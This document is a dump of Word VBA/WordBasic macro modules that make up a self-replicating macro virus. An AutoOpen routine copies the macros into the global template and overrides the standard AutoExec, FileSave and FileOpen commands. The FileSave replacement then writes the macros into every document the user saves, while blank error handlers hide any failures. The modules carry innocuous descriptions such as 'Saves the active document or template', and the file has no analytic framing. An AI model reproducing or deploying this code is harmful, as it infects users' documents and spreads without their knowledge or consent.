   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "TempFileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TempFileSave.MAIN"

       On Error GoTo -1: On Error GoTo ErrorHandler

       WordBasic.FileSave
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":TempAutoExec"
       WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":TempFileSave"
       WordBasic.MacroCopy "Global:FileOpen", WordBasic.[FileName$]() + ":TempFileOpen"
       WordBasic.MacroCopy "Global:TempAutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
       WordBasic.FileSaveAs Format:=1

       GoTo Finished

   ErrorHandler:

       Select Case Err.Number

           Case Else

       End Select

   Finished:

   End Sub

   Attribute VB_Name = "TempFileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Opens an existing document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TempFileOpen.MAIN"
   Dim rc
       rc = WordBasic.Call("PCDOCS.PCDOCSFileOpen")
   End Sub

   Attribute VB_Name = "TempAutoExec"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Automatically runs when Word is started. Initialises Word and calls the CTRL-SH-U Menu macro.\r\n"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TempAutoExec.MAIN"

       On Error GoTo -1: On Error GoTo ErrorHandler

       GoTo Finished

   ErrorHandler:

       Select Case Err.Number

           Case Else

       End Select

   Finished:

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()

       On Error GoTo -1: On Error GoTo ErrorHandler

       WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempAutoExec", "Global:AutoExec"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileSave", "Global:FileSave"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileOpen", "Global:FileOpen"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:TempAutoOpen"

       GoTo Finished

   ErrorHandler:

       Select Case Err.Number

           Case Else

       End Select

   Finished:

   End Sub
